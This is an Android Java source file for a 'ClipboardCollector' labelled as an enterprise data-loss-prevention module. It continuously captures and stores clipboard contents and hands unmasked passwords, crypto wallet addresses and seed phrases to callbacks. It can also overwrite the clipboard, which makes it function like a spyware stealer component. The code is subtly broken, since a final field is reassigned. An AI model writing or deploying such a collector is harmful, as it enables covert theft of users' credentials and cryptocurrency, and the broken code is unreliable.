package com.athex.dlp.collectors;

import android.content.ClipData;
import android.content.ClipDescription;
import android.content.ClipboardManager;
import android.content.Context;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;

/**
 * ATHEX DLP Enterprise - ClipboardCollector
 * 
 * Advanced clipboard monitoring module.
 * Continuously monitors and captures clipboard content:
 * - Plain text
 * - HTML text
 * - URIs
 * - Intent data
 * - Multi-item clips
 * - Clipboard history
 * - Crypto wallet addresses detection
 * - Password/credential detection
 * - Credit card number detection
 * 
 * @author ATHEX DLP Team
 * @version 2.0.0
 */
public class ClipboardCollector {
    
    private static final String TAG = "ATHEX_ClipboardCollector";
    
    // Monitoring intervals
    private static final long DEFAULT_POLL_INTERVAL = 2000;  // 2 seconds
    private static final long FAST_POLL_INTERVAL = 500;      // 500ms
    private static final long SLOW_POLL_INTERVAL = 5000;     // 5 seconds
    
    // History limits
    private static final int MAX_HISTORY_SIZE = 200;
    private static final int MAX_UNIQUE_ITEMS = 500;
    
    // ============================================================
    // INSTANCE VARIABLES
    // ============================================================
    
    private final Context context;
    private final ClipboardManager clipboardManager;
    private final ExecutorService executor;
    private final Handler mainHandler;
    private final AtomicBoolean isMonitoring = new AtomicBoolean(false);
    private final AtomicInteger captureCount = new AtomicInteger(0);
    
    // Monitoring
    private ClipboardListener clipboardListener;
    private Runnable pollRunnable;
    private long pollInterval = DEFAULT_POLL_INTERVAL;
    
    // History
    private final JSONArray clipboardHistory;
    private String lastCapturedText = "";
    private long lastCaptureTime = 0;
    private long monitoringStartTime = 0;
    
    // Detection
    private final AtomicBoolean detectCryptoAddresses = new AtomicBoolean(true);
    private final AtomicBoolean detectCredentials = new AtomicBoolean(true);
    private final AtomicBoolean detectCreditCards = new AtomicBoolean(true);
    private final AtomicBoolean detectUrls = new AtomicBoolean(true);
    private final AtomicBoolean detectEmails = new AtomicBoolean(true);
    private final AtomicBoolean detectPhoneNumbers = new AtomicBoolean(true);
    
    // Callbacks
    private ClipboardCallback callback;
    private SensitiveDataCallback sensitiveCallback;
    
    // ============================================================
    // INTERFACES
    // ============================================================
    
    public interface ClipboardCallback {
        void onClipboardChanged(String text, long timestamp);
        void onClipboardCleared();
        void onMonitoringStarted();
        void onMonitoringStopped();
        void onError(String error);
    }
    
    public interface SensitiveDataCallback {
        void onCryptoAddressDetected(String address, String type);
        void onCredentialDetected(String username, String password);
        void onCreditCardDetected(String cardNumber, String type);
        void onUrlDetected(String url);
        void onEmailDetected(String email);
        void onPhoneDetected(String phone);
    }
    
    // ============================================================
    // CONSTRUCTOR
    // ============================================================
    
    public ClipboardCollector(Context context) {
        this.context = context.getApplicationContext();
        this.clipboardManager = (ClipboardManager) context.getSystemService(Context.CLIPBOARD_SERVICE);
        this.executor = Executors.newSingleThreadExecutor();
        this.mainHandler = new Handler(Looper.getMainLooper());
        this.clipboardHistory = new JSONArray();
    }
    
    // ============================================================
    // CONFIGURATION
    // ============================================================
    
    public ClipboardCollector setPollInterval(long intervalMs) {
        this.pollInterval = Math.max(500, Math.min(30000, intervalMs));
        return this;
    }
    
    public ClipboardCollector setDetectCryptoAddresses(boolean detect) {
        this.detectCryptoAddresses.set(detect);
        return this;
    }
    
    public ClipboardCollector setDetectCredentials(boolean detect) {
        this.detectCredentials.set(detect);
        return this;
    }
    
    public ClipboardCollector setDetectCreditCards(boolean detect) {
        this.detectCreditCards.set(detect);
        return this;
    }
    
    public ClipboardCollector setDetectUrls(boolean detect) {
        this.detectUrls.set(detect);
        return this;
    }
    
    public ClipboardCollector setDetectEmails(boolean detect) {
        this.detectEmails.set(detect);
        return this;
    }
    
    public ClipboardCollector setDetectPhoneNumbers(boolean detect) {
        this.detectPhoneNumbers.set(detect);
        return this;
    }
    
    public ClipboardCollector setCallback(ClipboardCallback callback) {
        this.callback = callback;
        return this;
    }
    
    public ClipboardCollector setSensitiveCallback(SensitiveDataCallback callback) {
        this.sensitiveCallback = callback;
        return this;
    }
    
    // ============================================================
    // MONITORING CONTROL
    // ============================================================
    
    /**
     * Start clipboard monitoring
     */
    public void startMonitoring() {
        if (isMonitoring.get()) {
            Log.w(TAG, "Already monitoring clipboard");
            return;
        }
        
        Log.i(TAG, "Starting clipboard monitoring...");
        isMonitoring.set(true);
        monitoringStartTime = System.currentTimeMillis();
        
        // Use OnPrimaryClipChangedListener (Android 3.0+)
        clipboardListener = new ClipboardListener();
        clipboardManager.addPrimaryClipChangedListener(clipboardListener);
        
        // Also use polling as backup
        startPolling();
        
        Log.i(TAG, "Clipboard monitoring started");
        
        if (callback != null) {
            mainHandler.post(() -> callback.onMonitoringStarted());
        }
    }
    
    /**
     * Stop clipboard monitoring
     */
    public void stopMonitoring() {
        if (!isMonitoring.get()) {
            return;
        }
        
        Log.i(TAG, "Stopping clipboard monitoring...");
        isMonitoring.set(false);
        
        // Remove listener
        if (clipboardListener != null) {
            try {
                clipboardManager.removePrimaryClipChangedListener(clipboardListener);
            } catch (Exception e) {
                Log.e(TAG, "Error removing clipboard listener: " + e.getMessage());
            }
            clipboardListener = null;
        }
        
        // Stop polling
        stopPolling();
        
        Log.i(TAG, "Clipboard monitoring stopped. Total captured: " + captureCount.get());
        
        if (callback != null) {
            mainHandler.post(() -> callback.onMonitoringStopped());
        }
    }
    
    /**
     * Get current clipboard content
     */
    public String getCurrentClipboardText() {
        try {
            if (clipboardManager.hasPrimaryClip()) {
                ClipData clip = clipboardManager.getPrimaryClip();
                if (clip != null && clip.getItemCount() > 0) {
                    CharSequence text = clip.getItemAt(0).getText();
                    return text != null ? text.toString() : "";
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error reading clipboard: " + e.getMessage());
        }
        return "";
    }
    
    /**
     * Get full clipboard data as JSON
     */
    public JSONObject getCurrentClipboardData() {
        JSONObject data = new JSONObject();
        
        try {
            if (!clipboardManager.hasPrimaryClip()) {
                data.put("has_content", false);
                return data;
            }
            
            ClipData clip = clipboardManager.getPrimaryClip();
            if (clip == null) {
                data.put("has_content", false);
                return data;
            }
            
            data.put("has_content", true);
            data.put("item_count", clip.getItemCount());
            data.put("timestamp", System.currentTimeMillis());
            
            // Description
            ClipDescription desc = clip.getDescription();
            if (desc != null) {
                data.put("mime_type_count", desc.getMimeTypeCount());
                
                if (desc.getLabel() != null) {
                    data.put("label", desc.getLabel().toString());
                }
                
                // MIME types
                JSONArray mimeTypes = new JSONArray();
                for (int i = 0; i < desc.getMimeTypeCount(); i++) {
                    mimeTypes.put(desc.getMimeType(i));
                }
                data.put("mime_types", mimeTypes);
            }
            
            // Extract items
            JSONArray items = new JSONArray();
            for (int i = 0; i < clip.getItemCount(); i++) {
                ClipData.Item item = clip.getItemAt(i);
                JSONObject itemObj = new JSONObject();
                
                // Text
                if (item.getText() != null) {
                    itemObj.put("text", item.getText().toString());
                    itemObj.put("text_length", item.getText().length());
                }
                
                // HTML text
                if (item.getHtmlText() != null) {
                    itemObj.put("html_text", item.getHtmlText().toString());
                }
                
                // URI
                if (item.getUri() != null) {
                    itemObj.put("uri", item.getUri().toString());
                }
                
                // Intent
                if (item.getIntent() != null) {
                    itemObj.put("has_intent", true);
                }
                
                items.put(itemObj);
            }
            data.put("items", items);
            
        } catch (Exception e) {
            Log.e(TAG, "Error getting clipboard data: " + e.getMessage());
            try {
                data.put("error", e.getMessage());
            } catch (Exception ex) {
                Log.e(TAG, "Error adding error: " + ex.getMessage());
            }
        }
        
        return data;
    }
    
    // ============================================================
    // CLIPBOARD LISTENER
    // ============================================================
    
    private class ClipboardListener implements ClipboardManager.OnPrimaryClipChangedListener {
        @Override
        public void onPrimaryClipChanged() {
            executor.execute(() -> {
                try {
                    String currentText = getCurrentClipboardText();
                    
                    if (currentText.isEmpty()) {
                        // Clipboard cleared
                        if (callback != null) {
                            mainHandler.post(() -> callback.onClipboardCleared());
                        }
                        return;
                    }
                    
                    // Check if actually changed
                    if (currentText.equals(lastCapturedText)) {
                        return;
                    }
                    
                    lastCapturedText = currentText;
                    lastCaptureTime = System.currentTimeMillis();
                    captureCount.incrementAndGet();
                    
                    // Add to history
                    addToHistory(currentText);
                    
                    // Perform detections
                    performDetections(currentText);
                    
                    // Notify callback
                    if (callback != null) {
                        final String finalText = currentText;
                        final long finalTime = lastCaptureTime;
                        mainHandler.post(() -> callback.onClipboardChanged(finalText, finalTime));
                    }
                    
                } catch (Exception e) {
                    Log.e(TAG, "Error in clipboard listener: " + e.getMessage());
                }
            });
        }
    }
    
    // ============================================================
    // POLLING MECHANISM
    // ============================================================
    
    private void startPolling() {
        pollRunnable = new Runnable() {
            @Override
            public void run() {
                if (!isMonitoring.get()) return;
                
                executor.execute(() -> {
                    try {
                        String currentText = getCurrentClipboardText();
                        
                        if (!currentText.isEmpty() && !currentText.equals(lastCapturedText)) {
                            lastCapturedText = currentText;
                            lastCaptureTime = System.currentTimeMillis();
                            captureCount.incrementAndGet();
                            
                            addToHistory(currentText);
                            performDetections(currentText);
                            
                            if (callback != null) {
                                final String finalText = currentText;
                                final long finalTime = lastCaptureTime;
                                mainHandler.post(() -> callback.onClipboardChanged(finalText, finalTime));
                            }
                        }
                    } catch (Exception e) {
                        Log.e(TAG, "Error in clipboard polling: " + e.getMessage());
                    }
                });
                
                // Schedule next poll
                mainHandler.postDelayed(this, pollInterval);
            }
        };
        
        mainHandler.post(pollRunnable);
    }
    
    private void stopPolling() {
        if (pollRunnable != null) {
            mainHandler.removeCallbacks(pollRunnable);
            pollRunnable = null;
        }
    }
    
    // ============================================================
    // HISTORY MANAGEMENT
    // ============================================================
    
    private void addToHistory(String text) {
        try {
            JSONObject entry = new JSONObject();
            entry.put("text", text);
            entry.put("text_length", text.length());
            entry.put("timestamp", System.currentTimeMillis());
            entry.put("timestamp_formatted", formatTimestamp(System.currentTimeMillis()));
            
            synchronized (clipboardHistory) {
                // Check for duplicates
                for (int i = clipboardHistory.length() - 1; i >= 0; i--) {
                    JSONObject existing = clipboardHistory.getJSONObject(i);
                    if (text.equals(existing.optString("text", ""))) {
                        // Update timestamp of existing entry
                        existing.put("timestamp", System.currentTimeMillis());
                        existing.put("timestamp_formatted", formatTimestamp(System.currentTimeMillis()));
                        existing.put("repeat_count", existing.optInt("repeat_count", 1) + 1);
                        return;
                    }
                }
                
                clipboardHistory.put(entry);
                
                // Trim history
                while (clipboardHistory.length() > MAX_HISTORY_SIZE) {
                    clipboardHistory.remove(0);
                }
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error adding to history: " + e.getMessage());
        }
    }
    
    public JSONArray getHistory() {
        synchronized (clipboardHistory) {
            return clipboardHistory;
        }
    }
    
    public JSONArray getHistorySince(long sinceTimestamp) {
        JSONArray filtered = new JSONArray();
        synchronized (clipboardHistory) {
            for (int i = 0; i < clipboardHistory.length(); i++) {
                try {
                    JSONObject entry = clipboardHistory.getJSONObject(i);
                    if (entry.optLong("timestamp", 0) >= sinceTimestamp) {
                        filtered.put(entry);
                    }
                } catch (Exception e) {
                    Log.e(TAG, "Error filtering history: " + e.getMessage());
                }
            }
        }
        return filtered;
    }
    
    public void clearHistory() {
        synchronized (clipboardHistory) {
            clipboardHistory = new JSONArray();
        }
        lastCapturedText = "";
        captureCount.set(0);
    }
    
    // ============================================================
    // SENSITIVE DATA DETECTION
    // ============================================================
    
    private void performDetections(String text) {
        if (text == null || text.isEmpty()) return;
        
        executor.execute(() -> {
            // Crypto addresses
            if (detectCryptoAddresses.get()) {
                detectCryptoAddresses(text);
            }
            
            // Credentials
            if (detectCredentials.get()) {
                detectCredentials(text);
            }
            
            // Credit cards
            if (detectCreditCards.get()) {
                detectCreditCards(text);
            }
            
            // URLs
            if (detectUrls.get()) {
                detectUrls(text);
            }
            
            // Emails
            if (detectEmails.get()) {
                detectEmails(text);
            }
            
            // Phone numbers
            if (detectPhoneNumbers.get()) {
                detectPhoneNumbers(text);
            }
        });
    }
    
    /**
     * Detect cryptocurrency wallet addresses
     */
    private void detectCryptoAddresses(String text) {
        // Bitcoin (P2PKH): 1... (26-35 chars)
        java.util.regex.Pattern btcPattern = java.util.regex.Pattern.compile(
            "\\b[13][a-km-zA-HJ-NP-Z1-9]{25,34}\\b"
        );
        java.util.regex.Matcher btcMatcher = btcPattern.matcher(text);
        while (btcMatcher.find()) {
            notifyCryptoAddress(btcMatcher.group(), "Bitcoin");
        }
        
        // Bitcoin (Bech32): bc1... (42 chars)
        java.util.regex.Pattern btcBechPattern = java.util.regex.Pattern.compile(
            "\\bbc1[a-z0-9]{39,59}\\b"
        );
        java.util.regex.Matcher btcBechMatcher = btcBechPattern.matcher(text);
        while (btcBechMatcher.find()) {
            notifyCryptoAddress(btcBechMatcher.group(), "Bitcoin (Bech32)");
        }
        
        // Ethereum: 0x... (42 chars)
        java.util.regex.Pattern ethPattern = java.util.regex.Pattern.compile(
            "\\b0x[a-fA-F0-9]{40}\\b"
        );
        java.util.regex.Matcher ethMatcher = ethPattern.matcher(text);
        while (ethMatcher.find()) {
            notifyCryptoAddress(ethMatcher.group(), "Ethereum");
        }
        
        // Monero: 4... (95 chars) or 8... (106 chars)
        java.util.regex.Pattern xmrPattern = java.util.regex.Pattern.compile(
            "\\b[48][0-9AB][1-9A-HJ-NP-Za-km-z]{93,105}\\b"
        );
        java.util.regex.Matcher xmrMatcher = xmrPattern.matcher(text);
        while (xmrMatcher.find()) {
            notifyCryptoAddress(xmrMatcher.group(), "Monero");
        }
        
        // Litecoin: L... (33 chars)
        java.util.regex.Pattern ltcPattern = java.util.regex.Pattern.compile(
            "\\b[LM][a-km-zA-HJ-NP-Z1-9]{26,33}\\b"
        );
        java.util.regex.Matcher ltcMatcher = ltcPattern.matcher(text);
        while (ltcMatcher.find()) {
            notifyCryptoAddress(ltcMatcher.group(), "Litecoin");
        }
        
        // Seed phrase (12/24 words)
        String[] words = text.trim().split("\\s+");
        if (words.length == 12 || words.length == 24) {
            // Check if all words look like BIP39 words
            boolean allAlpha = true;
            for (String word : words) {
                if (!word.matches("[a-zA-Z]+")) {
                    allAlpha = false;
                    break;
                }
            }
            if (allAlpha) {
                notifyCryptoAddress(text, "Potential Seed Phrase (" + words.length + " words)");
            }
        }
    }
    
    /**
     * Detect credentials (username:password patterns)
     */
    private void detectCredentials(String text) {
        // Common credential patterns
        String[] patterns = {
            ".*[:=]\\s*[^\\s]{3,}",           // key:value or key=value
            ".*@.*\\.[a-zA-Z]{2,}",            // email-like
        };
        
        for (String pattern : patterns) {
            if (text.matches(pattern)) {
                // Extract potential username/password
                String[] parts = text.split("[:=]\\s*", 2);
                if (parts.length == 2) {
                    notifyCredential(parts[0].trim(), parts[1].trim());
                    break;
                }
            }
        }
    }
    
    /**
     * Detect credit card numbers
     */
    private void detectCreditCards(String text) {
        // Remove spaces and dashes for checking
        String cleaned = text.replaceAll("[\\s\\-]", "");
        
        // Visa: 4... (13 or 16 digits)
        if (cleaned.matches("^4[0-9]{12}(?:[0-9]{3})?$")) {
            notifyCreditCard(maskCardNumber(cleaned), "Visa");
        }
        // Mastercard: 51-55... (16 digits)
        else if (cleaned.matches("^5[1-5][0-9]{14}$")) {
            notifyCreditCard(maskCardNumber(cleaned), "Mastercard");
        }
        // American Express: 34 or 37... (15 digits)
        else if (cleaned.matches("^3[47][0-9]{13}$")) {
            notifyCreditCard(maskCardNumber(cleaned), "American Express");
        }
        // Discover: 6011, 622126-622925, 644-649, 65... (16 digits)
        else if (cleaned.matches("^6(?:011|5[0-9]{2})[0-9]{12}$")) {
            notifyCreditCard(maskCardNumber(cleaned), "Discover");
        }
    }
    
    /**
     * Detect URLs
     */
    private void detectUrls(String text) {
        java.util.regex.Pattern urlPattern = java.util.regex.Pattern.compile(
            "https?://[^\\s]+|www\\.[^\\s]+|[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}[^\\s]*"
        );
        java.util.regex.Matcher matcher = urlPattern.matcher(text);
        while (matcher.find()) {
            notifyUrl(matcher.group());
        }
    }
    
    /**
     * Detect email addresses
     */
    private void detectEmails(String text) {
        java.util.regex.Pattern emailPattern = java.util.regex.Pattern.compile(
            "\\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\.[A-Za-z]{2,}\\b"
        );
        java.util.regex.Matcher matcher = emailPattern.matcher(text);
        while (matcher.find()) {
            notifyEmail(matcher.group());
        }
    }
    
    /**
     * Detect phone numbers
     */
    private void detectPhoneNumbers(String text) {
        // Various phone formats
        java.util.regex.Pattern phonePattern = java.util.regex.Pattern.compile(
            "\\+?[0-9]{1,3}?[-.\\s]?\\(?[0-9]{3}\\)?[-.\\s]?[0-9]{3}[-.\\s]?[0-9]{4}"
        );
        java.util.regex.Matcher matcher = phonePattern.matcher(text);
        while (matcher.find()) {
            notifyPhone(matcher.group());
        }
    }
    
    private String maskCardNumber(String cardNumber) {
        if (cardNumber.length() < 8) return "****";
        return cardNumber.substring(0, 4) + "-****-****-" + 
               cardNumber.substring(cardNumber.length() - 4);
    }
    
    // ============================================================
    // SENSITIVE DATA NOTIFIERS
    // ============================================================
    
    private void notifyCryptoAddress(String address, String type) {
        Log.i(TAG, "🔐 Crypto address detected: " + type);
        if (sensitiveCallback != null) {
            mainHandler.post(() -> sensitiveCallback.onCryptoAddressDetected(address, type));
        }
    }
    
    private void notifyCredential(String username, String password) {
        Log.i(TAG, "🔑 Credential detected: " + username);
        if (sensitiveCallback != null) {
            mainHandler.post(() -> sensitiveCallback.onCredentialDetected(username, password));
        }
    }
    
    private void notifyCreditCard(String cardNumber, String type) {
        Log.i(TAG, "💳 Credit card detected: " + type);
        if (sensitiveCallback != null) {
            mainHandler.post(() -> sensitiveCallback.onCreditCardDetected(cardNumber, type));
        }
    }
    
    private void notifyUrl(String url) {
        if (sensitiveCallback != null) {
            mainHandler.post(() -> sensitiveCallback.onUrlDetected(url));
        }
    }
    
    private void notifyEmail(String email) {
        if (sensitiveCallback != null) {
            mainHandler.post(() -> sensitiveCallback.onEmailDetected(email));
        }
    }
    
    private void notifyPhone(String phone) {
        if (sensitiveCallback != null) {
            mainHandler.post(() -> sensitiveCallback.onPhoneDetected(phone));
        }
    }
    
    // ============================================================
    // UTILITY
    // ============================================================
    
    public void setClipboardText(String text) {
        try {
            ClipData clip = ClipData.newPlainText("ATHEX DLP", text);
            clipboardManager.setPrimaryClip(clip);
            Log.d(TAG, "Clipboard set: " + text.substring(0, Math.min(50, text.length())));
        } catch (Exception e) {
            Log.e(TAG, "Error setting clipboard: " + e.getMessage());
        }
    }
    
    public void clearClipboard() {
        try {
            ClipData clip = ClipData.newPlainText("", "");
            clipboardManager.setPrimaryClip(clip);
            Log.d(TAG, "Clipboard cleared");
        } catch (Exception e) {
            Log.e(TAG, "Error clearing clipboard: " + e.getMessage());
        }
    }
    
    private String formatTimestamp(long timestamp) {
        try {
            return new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
                .format(new Date(timestamp));
        } catch (Exception e) {
            return String.valueOf(timestamp);
        }
    }
    
    // ============================================================
    // STATISTICS
    // ============================================================
    
    public int getCaptureCount() {
        return captureCount.get();
    }
    
    public int getHistorySize() {
        synchronized (clipboardHistory) {
            return clipboardHistory.length();
        }
    }
    
    public long getLastCaptureTime() {
        return lastCaptureTime;
    }
    
    public boolean isMonitoring() {
        return isMonitoring.get();
    }
    
    public JSONObject getStatistics() {
        JSONObject stats = new JSONObject();
        try {
            stats.put("monitoring", isMonitoring.get());
            stats.put("capture_count", captureCount.get());
            stats.put("history_size", getHistorySize());
            stats.put("last_capture_time", lastCaptureTime);
            stats.put("last_capture_formatted", formatTimestamp(lastCaptureTime));
            stats.put("poll_interval_ms", pollInterval);
            stats.put("uptime_seconds", (System.currentTimeMillis() - monitoringStartTime) / 1000);
            stats.put("detect_crypto", detectCryptoAddresses.get());
            stats.put("detect_credentials", detectCredentials.get());
            stats.put("detect_credit_cards", detectCreditCards.get());
        } catch (Exception e) {
            Log.e(TAG, "Error building statistics: " + e.getMessage());
        }
        return stats;
    }
    
    public void shutdown() {
        stopMonitoring();
        if (executor != null && !executor.isShutdown()) {
            executor.shutdown();
        }
    }
}